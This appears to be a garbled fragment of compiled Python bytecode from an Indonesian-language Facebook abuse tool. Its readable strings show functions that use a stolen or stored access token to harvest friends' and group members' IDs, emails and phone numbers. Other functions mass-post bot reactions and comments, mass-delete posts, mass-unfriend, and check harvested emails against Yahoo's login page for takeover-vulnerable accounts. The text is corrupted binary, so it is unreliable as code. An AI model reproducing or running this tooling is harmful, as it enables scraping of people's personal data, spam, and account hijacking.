 t j d  } y | j |
  j   } Wn d | GHq0n Xd | k r;| j | d  d | GHqGd | GHq0q0Wd GHd GH| j   t	 d  t   d  S(    NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs'   [1;91m[+] [1;92mFile [1;91m: [1;97ms   [1;91m[!] File tidak adas!   
[1;91m[ [1;97mKembali [1;91m]i    s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   MailVuln.txtRU   s5   [1;91m[?] [1;97mStatus [1;91m:  [1;97mRed[[1;92ms   [1;97m]  Green[[1;92ms   [1;97m]s   
R   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR@   RÆ   s$   "messages.ERROR_INVALID_USERNAME">.*s   [1;91m s"   "messages.ERROR_INVALID_USERNAME">s   [1;92m s   
[1;91m[+] [1;97mSelesais8   [1;91m[+] [1;97mTersimpan [1;91m:[1;97m MailVuln.txt(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rà   R£   R   Ró   Rô   R   R¿   RÝ   Rð   Rñ   Rò   R_   Rb   Rc   Rd   Re   Rg   R   Rr   (   Ru   t   filesRâ   Rú   RÇ   Rõ   Rø   Rä   Rû   R   Rü   Rý   Rþ   (    (    R   Rî   º  sl    	

	

	

c          C   s¸   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHd GHd GHt	   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs!   â-> [1;37;40m1. Ambil ID temans,   â-> [1;37;40m2. Ambil ID teman dari temans'   â-> [1;37;40m3. Ambil ID member GRUPs$   â-> [1;37;40m4. Ambil Email temans/   â-> [1;37;40m5. Ambil Email teman dari temans$   â-> [1;37;40m6. Ambil No HP temans/   â-> [1;37;40m7. Ambil No HP teman dari temans   â-> [1;37;40m8. Split Files   â-> [1;31;40m0. Kembalis
   [1;97mâ(
   R   RX   RY   R"   R\   R   R   Rt   R]   t
   grab_pilih(   Ru   (    (    R   R¤   ø  s,    	c          C   s1  t  d  }  |  d k r' d GHt   n|  d k r= t   nð|  d k rS t   nÚ|  d k ri t   nÄ|  d k r t   n®|  d k r t   n|  d	 k r« t   n|  d
 k rÁ t   nl|  d k rt	 j
 d  t GHd d GHt  d  } t  d  } t	 j j |  rê| j   rêt	 j d | d  j   j   } t	 j d t |  d t |  d  j   j   } t	 j d | d  j   j   } t	 j
 d t |  d t t |   d | d |  t  d  t   q-d GHt  d  t   n* |  d k rt   n d |  d  GHt   d  S(!   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   R   R   R   R   R   t   7t   8R?   i4   s
   [1;97mâsD   [1;91m[+] [1;92mFile [1;97mext(/sdcard/file.txt) [1;91m: [1;97ms9   [1;91m[+] [1;92mLine [1;97m(per file) [1;91m: [1;97ms   wc -l s    | awk '{print $1}'s   echo $((s    / s   ))s
   FILENAME="s   "; echo "${FILENAME%.*}."s   split --verbose --lines=s    --suffix-length=s    --numeric-suffixes=1 t    s!   
[1;91m[ [1;97mKembali [1;91m]s3   [1;91m[!] File tidak ada / Format line harus angkaRO   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R(   R   t   id_temant   idfrom_temant   id_member_grupRA   t   emailfrom_temant   nomor_hpt   hpfrom_temanR   RX   R]   t   patht   isfilet   isdigitR!   R"   R#   R   R   R¤   R   (   t   cuihR¹   t   linest   total_linest   suffixt   preffix(    (    R   R     sL    







	#7#;




c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n¯Xyt  j d  t GHd d GHt	 j
 d	 |   } t j | j  } t d
  } t | d  } t d  d d GHx[ | d D]O } t j | d  | j | d d  d | d GHd | d GHd d GHqÜ Wd t t  GHd | GH| j   t d  t   Wn¨ t k
 rd GHt d  t   n t t f k
 r¸d GHt d  t   nV t k
 rët  j |  d GHt d  t   n# t	 j j k
 rd GHt   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs3   https://graph.facebook.com/me/friends?access_token=sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97mRU   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...Rx   R4   s   
s   [1;92mNama[1;91m  :[1;97m R|   s   [1;92mID   [1;91m : [1;97ms'   
[1;91m[+] [1;97mJumlah ID [1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms!   
[1;91m[ [1;97mKembali [1;91m]s&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[!] Kesalahan terjadis   [1;91m[â] Tidak ada koneksi(   R   RX   RY   R"   R\   R   R   Rt   R]   Rm   Rn   Ro   Rp   Rq   R(   R   R1   R¿   R   R   Rr   R¤   t   KeyboardInterruptt   EOFErrorR[   t   removeRs   R   R	   (   Ru   R   R   t   save_idt   bzt   ah(    (    R   R  F  sZ    	
		







c    	      C   s_  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nüXyt  j d  t GHd d GHt	 d	  } y> t
 j d
 | d |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xt
 j d
 | d |   } t j | j  } t	 d  } t | d  } t d  d d GHx_ | d d D]O } t j | d  | j | d d  d | d GHd | d GHd d GHq\Wd t t  GHd | GH| j   t	 d  t   Wnu t k
 rd GHt	 d  t   nO t t f k
 r8d GHt	 d  t   n# t
 j j k
 rZd GHt   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs3   [1;91m[+] [1;92mMasukan ID Teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m R|   s   [1;91m[!] Belum bertemans!   
[1;91m[ [1;97mKembali [1;91m]s)   ?fields=friends.limit(5000)&access_token=sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97mRU   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...t   friendsRx   R4   s   
s   [1;92mNama[1;91m  :[1;97m s   [1;92mID   [1;91m : [1;97ms'   
[1;91m[+] [1;97mJumlah ID [1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R[   R¤   R   R2   R¿   R   R   Rr   R  R  Rs   R   R	   (	   Ru   t   idtRý   t   opR   R   t   save_idtR  R  (    (    R   R  x  sb    	

		





c             s+  t  j d  y t d d  j    Wn7 t k
 r_ d GHt  j d  t j d  t   nÈXyt  j d  t GHd d GHt	 d	    y> t
 j d
   d   }  t j |  j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xt	 d   t d  d d GH f d        f d   }  f d   } |   |   d t t  GHd  GHt	 d  t   Wn¨ t k
 r¥d GHt	 d  t   n t t f k
 rÑd GHt	 d  t   nV t k
 rt  j   d GHt	 d  t   n# t
 j j k
 r&d GHt   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs*   [1;91m[+] [1;92mID grup [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m R|   s   [1;91m[!] Grup tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m]sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...c            s   t  j |   } t j | j  } | d } x# | d D] } t j | d  q6 W| j d  d  k	 r|   | j d   n  d  S(   Nt   pagingRx   R4   t   next(   Rm   Rn   Ro   Rp   Rq   R3   R¿   t   None(   t   next_urlt   next_dump_apit   next_result_jsont	   next_paget   ni(   t	   next_dump(    R   R$  Ë  s    
c             s   t  j d   d   }  t j |  j  } | d } x# | d D] } t j | d  qB W| j d  d  k	 r  | j d   n  d  S(   Ns   https://graph.facebook.com/s8   /members?fileds=id&limit=5000&summary=true&access_token=R  Rx   R4   R  (   Rm   Rn   Ro   Rp   Rq   R3   R¿   R  (   t   dump_apit   result_jsont   pageRÞ   (   R4   R$  Ru   (    R   t   dumpÔ  s    
c             s>   t    d  ) }  x t D] } |  j | d  q WWd  QXd  S(   NRU   s   
(   RY   R3   R   (   t   fpRß   (   t   simg(    R   Rø   Ý  s    s'   
[1;91m[+] [1;97mJumlah ID [1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R[   R¤   R   R   R3   R  R  R  Rs   R   R	   (   R   RÜ   R(  Rø   (    (   R4   R$  R*  Ru   R   R  ¯  sb    	

				






c          C   s[  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nøXyLt  j d  t GHd d GHt	 d	  } t
 j d
 |   } t j | j  } t | d  } t d  d d GHx¤ | d D] } t
 j d | d d |   } t j | j  } yM t j | d  | j | d d  d | d GHd | d GHd d GHWqÜ t k
 rsqÜ XqÜ Wd t t  GHd | GH| j   t	 d  t   Wn¨ t k
 rÕd GHt	 d  t   n t t f k
 rd GHt	 d  t   nV t k
 r4t  j |  d GHt	 d  t   n# t
 j j k
 rVd GHt   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâsC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms3   https://graph.facebook.com/me/friends?access_token=RU   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...Rx   s   https://graph.facebook.com/R4   s   ?access_token=RA   s   
s   [1;92mNama[1;91m  :[1;97m R|   s   [1;92mEmail[1;91m : [1;97ms)   
[1;91m[+] [1;97mJumlah Email[1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms!   
[1;91m[ [1;97mKembali [1;91m]s&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[!] Kesalahan terjadis   [1;91m[â] Tidak ada koneksi(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R   R5   R¿   R   R[   R   Rr   R¤   R  R  R  Rs   R   R	   (   Ru   t   mailsR   Rz   RÇ   RÞ   Ry   R   (    (    R   RA   ú  sd    	
		







c          C   s¤  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nAXyÈt  j d  t GHd d GHt	 d	  } y> t
 j d
 | d |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xt	 d  } t
 j d
 | d |   } t j | j  } t | d  } t d  d d GHx¤ | d D] } t
 j d
 | d d |   }	 t j |	 j  }
 yM t j |
 d  | j |
 d d  d |
 d GHd |
 d GHd d GHWqXt k
 rïqXXqXWd t t  GHd | GH| j   t	 d  t   Wnu t k
 rQd GHt	 d  t   nO t t f k
 r}d GHt	 d  t   n# t
 j j k
 rd GHt   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs3   [1;91m[+] [1;92mMasukan ID Teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m R|   s   [1;91m[!] Belum bertemans!   
[1;91m[ [1;97mKembali [1;91m]sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms   /friends?access_token=RU   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...Rx   R4   RA   s   
s   [1;92mNama[1;91m  :[1;97m s   [1;92mEmail[1;91m : [1;97ms)   
[1;91m[+] [1;97mJumlah Email[1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R[   R¤   R   R6   R¿   R   R   Rr   R  R  Rs   R   R	   (   Ru   R  Rý   R  R+  R   Rz   RÇ   RÞ   Ry   R   (    (    R   R  1  sl    	

		





c          C   sa  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nþXyRt  j d  t GHd d GHt	 d	  } d
 |  } t
 j |  } t j | j  } t | d  } t d  d d GHx¤ | d D] } t
 j d | d d |   } t j | j  } yM t j | d  | j | d d  d | d GHd | d GHd d GHWqâ t k
 ryqâ Xqâ Wd t t  GHd | GH| j   t	 d  t   Wn¨ t k
 rÛd GHt	 d  t   n t t f k
 rd GHt	 d  t   nV t k
 r:t  j |  d GHt	 d  t   n# t
 j j k
 r\d GHt   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâsC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms3   https://graph.facebook.com/me/friends?access_token=RU   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...Rx   s   https://graph.facebook.com/R4   s   ?access_token=R   s   
s   [1;92mNama[1;91m  :[1;97m R|   s   [1;92mNomor[1;91m : [1;97ms)   
[1;91m[+] [1;97mJumlah Nomor[1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms!   
[1;91m[ [1;97mKembali [1;91m]s&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[!] Kesalahan terjadis   [1;91m[â] Tidak ada koneksi(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R   R7   R¿   R   R[   R   Rr   R¤   R  R  R  Rs   R   R	   (   Ru   t   nomsRw   R   R   t   not   nRy   (    (    R   R  m  sf    	

		







c          C   s¤  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nAXyÈt  j d  t GHd d GHt	 d	  } y> t
 j d
 | d |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xt	 d  } t
 j d
 | d |   } t j | j  } t | d  } t d  d d GHx¤ | d D] } t
 j d
 | d d |   }	 t j |	 j  }
 yM t j |
 d  | j |
 d d  d |
 d GHd |
 d GHd d GHWqXt k
 rïqXXqXWd t t  GHd | GH| j   t	 d  t   Wnu t k
 rQd GHt	 d  t   nO t t f k
 r}d GHt	 d  t   n# t
 j j k
 rd GHt   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs3   [1;91m[+] [1;92mMasukan ID Teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m R|   s   [1;91m[!] Belum bertemans!   
[1;91m[ [1;97mKembali [1;91m]sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms   /friends?access_token=RU   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...Rx   R4   R   s   
s   [1;92mNama[1;91m  :[1;97m s   [1;92mNomor[1;91m : [1;97ms)   
[1;91m[+] [1;97mJumlah Nomor[1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R[   R¤   R   R8   R¿   R   R   Rr   R  R  Rs   R   R	   (   Ru   R  Rý   R  R,  R   Rz   R-  RÞ   Ry   R   (    (    R   R	  ¥  sl    	

		





c          C   s³   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHd GHt	   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs,   â-> [1;37;40m1. Bot Reactions Target Posts*   â-> [1;37;40m2. Bot Reactions Grup Posts(   â-> [1;37;40m3. Bot Komen Target Posts&   â-> [1;37;40m4. Bot Komen Grup Posts#   â-> [1;37;40m5. Mass delete Posts/   â-> [1;37;40m6. Terima permintaan pertemanans#   â-> [1;37;40m7. Hapus pertemanans   â-> [1;31;40m0. Kembalis
   [1;97mâ(
   R   RX   RY   R"   R\   R   R   Rt   R]   t	   bot_pilih(   Ru   (    (    R   R   á  s*    	c          C   sï   t  d  }  |  d k r' d GHt   nÄ |  d k r= t   n® |  d k rS t   n |  d k ri t   n |  d k r t   nl |  d k r t   nV |  d	 k r« t   n@ |  d
 k rÁ t   n* |  d k r× t	   n d |  d GHt   d  S(   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   R   R   R   R   R   R  RO   s   [1;91m[â] [1;97ms    [1;91mTidak ada(
   R(   R/  t
   menu_reactt
   grup_reactt	   bot_koment
   grup_koment
   deletepostt   acceptt   unfriendRZ   (   t   bots(    (    R   R/  ú  s,    








c          C   s®   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHt	   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs   â-> [1;37;40m1. [1;97mLikes   â-> [1;37;40m2. [1;97mLoves   â-> [1;37;40m3. [1;97mWows   â-> [1;37;40m4. [1;97mHahas   â-> [1;37;40m5. [1;97mSedihs   â-> [1;37;40m6. [1;97mMarahs   â-> [1;31;40m0. Kembalis
   [1;97mâ(
   R   RX   RY   R"   R\   R   R   Rt   R]   t   react_pilih(   Ru   (    (    R   R0    s(    	c          C   sý   t  d  }  |  d k r' d GHt   nÒ |  d k rC d a t   n¶ |  d k r_ d a t   n |  d k r{ d	 a t   n~ |  d
 k r d a t   nb |  d k r³ d a t   nF |  d k rÏ d a t   n* |  d k rå t   n d |  d GHt   d  S(   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   t   LIKER   t   LOVER   t   WOWR   t   HAHAR   t   SADR   t   ANGRYRO   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R(   R8  t   tipet   reactR   (   t   aksi(    (    R   R8  4  s4    







c          C   s¦  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nCXt  j d  t GHd d GHt	 d	  } t	 d
  } yå t
 j d | d | d |   } t j | j  } t d  d d GHxo | d d D]_ } | d } t j |  t
 j d | d t d |   d | d  j d d  d t GHqí WHd t t t   GHt	 d  t   Wn' t k
 r¡d GHt	 d  t   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...t   feedRx   R4   s   /reactions?type=s   &access_token=s   [1;92m[[1;97mi
   s   
R  s   ... [1;92m] [1;97ms"   [1;91m[+][1;97m Selesai [1;96ms!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] ID Tidak ditemukan(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R   R9   R¿   R   R?  R   R   R   R   R[   (   Ru   t   idet   limitt   ohR  Rz   R°   (    (    R   R@  Z  s>    	#
	
!%

c          C   s®   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHt	   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs   â-> [1;37;40m1. [1;97mLikes   â-> [1;37;40m2. [1;97mLoves   â-> [1;37;40m3. [1;97mWows   â-> [1;37;40m4. [1;97mHahas   â-> [1;37;40m5. [1;97mSedihs   â-> [1;37;40m6. [1;97mMarahs   â-> [1;31;40m0. Kembalis
   [1;97mâ(
   R   RX   RY   R"   R\   R   R   Rt   R]   t   reactg_pilih(   Ru   (    (    R   R1  ~  s(    	c          C   sý   t  d  }  |  d k r' d GHt   nÒ |  d k rC d a t   n¶ |  d k r_ d a t   n |  d k r{ d	 a t   n~ |  d
 k r d a t   nb |  d k r³ d a t   nF |  d k rÏ d a t   n* |  d k rå t   n d |  d GHt   d  S(   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   R9  R   R:  R   R;  R   R<  R   R=  R   R>  RO   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R(   RF  R?  t   reactgR   (   RA  (    (    R   RF    s4    







c          C   sà  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n}Xt  j d  t GHd d GHt	 d	  } t	 d
  } t
 j d | d |   } t j | j  } d | d GHyå t
 j d | d | d |   } t j | j  } t d  d d GHxo | d d D]_ } | d } t j |  t
 j d | d t d |   d | d  j d d  d t GHq'WHd t t t   GHt	 d  t   Wn' t k
 rÛd GHt	 d  t   n Xd  S(    NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs*   [1;91m[+] [1;92mID Grup [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m R|   s    https://graph.facebook.com/v3.0/s   ?fields=feed.limit(s   )&access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...RB  Rx   R4   s   https://graph.facebook.com/s   /reactions?type=s   [1;92m[[1;97mi
   s   
R  s   ... [1;92m] [1;97ms"   [1;91m[+][1;97m Selesai [1;96ms!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] ID Tidak ditemukan(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R   R:   R¿   R   R?  R   R   R   R   R[   (   Ru   RC  RD  R  RÜ   RE  Rz   R°   (    (    R   RG  ¼  sD    	#
	
!%

c          C   sÅ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nbXt  j d  t GHd d GHd	 GHt	 d
  } t	 d  } t	 d  } | j
 d d  } yá t j d | d | d |   } t j | j  } t d  d d GHxk | d d D][ } | d } t j |  t j d | d | d |   d | d  j
 d d  d GHqWHd t t t   GHt	 d  t   Wn' t k
 rÀd GHt	 d  t   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs=   [1;91m[!] [1;92mGunakan [1;97m'<>' [1;92mUntuk Baris Barus,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s,   [1;91m[+] [1;92mKomentar  [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   <>s   
s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...RB  Rx   R4   s   /comments?message=s   &access_token=s   [1;92m[[1;97mi
   R  s   ... [1;92m]s"   [1;91m[+][1;97m Selesai [1;96ms!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] ID Tidak ditemukan(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   R   Rm   Rn   Ro   Rp   Rq   R   R;   R¿   R   R   R   R   R[   (   Ru   RC  t   kmRD  R   Rz   RÚ   t   f(    (    R   R2  ã  sD    	#
	
!!

c    
      C   sÿ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nXt  j d  t GHd d GHd	 GHt	 d
  } t	 d  } t	 d  } | j
 d d  } yt j d | d |   } t j | j  } d | d GHt j d | d | d |   } t j | j  } t d  d d GHxk | d d D][ } | d }	 t j |	  t j d |	 d | d |   d | d  j
 d d  d GHqJWHd  t t t   GHt	 d!  t   Wn' t k
 rúd" GHt	 d!  t   n Xd  S(#   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs=   [1;91m[!] [1;92mGunakan [1;97m'<>' [1;92mUntuk Baris Barus+   [1;91m[+] [1;92mID Grup  [1;91m:[1;97m s+   [1;91m[+] [1;92mKomentar [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   <>s   
s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m R|   s    https://graph.facebook.com/v3.0/s   ?fields=feed.limit(s   )&access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...RB  Rx   R4   s   https://graph.facebook.com/s   /comments?message=s   [1;92m[[1;97mi
   R  s   ... [1;92m]s"   [1;91m[+][1;97m Selesai [1;96ms!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] ID Tidak ditemukan(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   R   Rm   Rn   Ro   Rp   Rq   R   R<   R¿   R   R   R   R   R[   (
   Ru   RC  RH  RD  R  RÜ   R   Rz   RÚ   RI  (    (    R   R3  
  sJ    	#
	
!!

c          C   sõ  t  j d  yH t d d  j   }  t j d |   } t j | j  } | d } Wn7 t	 k
 r d GHt  j d  t
 j d  t   n Xt  j d  t GHd	 d
 GHd | GHt d  d	 d
 GHt j d |   } t j | j  } xí | d D]á } | d } d } t j d | d |   }	 t j |	 j  }
 y3 |
 d d } d | d  j d d  d d GHWqö t k
 rªd | d  j d d  d d GH| d 7} qö t j j k
 rÖd GHt d  t   qö Xqö Wd GHt d  t   d  S(    NR?   s	   login.txtR   s+   https://graph.facebook.com/me?access_token=R|   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs)   [1;91m[+] [1;92mFrom [1;91m: [1;97m%ss?   [1;91m[+] [1;92mMulai menghapus postingan unfaedah[1;97m ...s0   https://graph.facebook.com/me/feed?access_token=Rx   R4   i    s   https://graph.facebook.com/s   ?method=delete&access_token=t   errort   messages   [1;91m[[1;97mi
   s   
R  s   ...s   [1;91m] [1;95mGagals   [1;92m[[1;97ms   [1;92m] [1;96mTerhapuss   [1;91m[!] Koneksi Errors!   
[1;91m[ [1;97mKembali [1;91m]s   
[1;91m[+] [1;97mSelesai(   R   RX   RY   R"   Rm   Rn   Ro   Rp   Rq   R\   R   R   Rt   R]   R   R   t	   TypeErrorRs   R   R(   R   (   Ru   t   namt   lolR   t   asut   asusR   R4   t   piroRw   t   okRJ  (    (    R   R4  4  sJ    		
	
%!

c          C   sÍ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHt	 d	  } t
 j d
 | d |   } t j | j  } d t | d  k rã d GHt	 d  t   n  t d  d d GHxº | d D]® } t
 j d | d d d |   } t j | j  } d t |  k rd | d d GHd | d d d GHd d GHqd | d d GHd | d d d GHd d GHqWd GHt	 d  t   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s3   https://graph.facebook.com/me/friendrequests?limit=s   &access_token=s   []Rx   s*   [1;91m[!] Tidak ada permintaan pertemanans!   
[1;91m[ [1;97mKembali [1;91m]s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s&   https://graph.facebook.com/me/friends/t   fromR4   s   ?access_token=RJ  s(   [1;91m[+] [1;92mNama  [1;91m:[1;97m R|   s(   [1;91m[+] [1;92mID    [1;91m:[1;97m s   [1;91m Gagals   [1;92m Berhasils   
[1;91m[+] [1;97mSelesai(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rm   Rn   Ro   Rp   Rq   R   R   R   R   (   Ru   RD  R   Rö   RÞ   t   gasRz   (    (    R   R5  ^  sB    	


	#
c          C   sd  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   në Xt  j d  t GHd d GHt	 d	  d d GHd
 GHHy| t
 j d |   } t j | j  } xP | d D]D } | d } | d } t
 j d | d |   d | d | GHqÇ WWn7 t k
 r#n' t k
 rId GHt d  t   n Xd GHt d  t   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   [1;97mStop [1;91mCTRL+Cs3   https://graph.facebook.com/me/friends?access_token=Rx   R|   R4   s*   https://graph.facebook.com/me/friends?uid=s   &access_token=s    [1;97m[[1;92mTerhapus[1;97m] s    => s   [1;91m[!] Terhentis!   
[1;91m[ [1;97mKembali [1;91m]s   
[1;91m[+] [1;97mSelesai(   R   RX   RY   R"   R\   R   R   Rt   R]   R   Rm   Rn   Ro   Rp   Rq   t   deletet
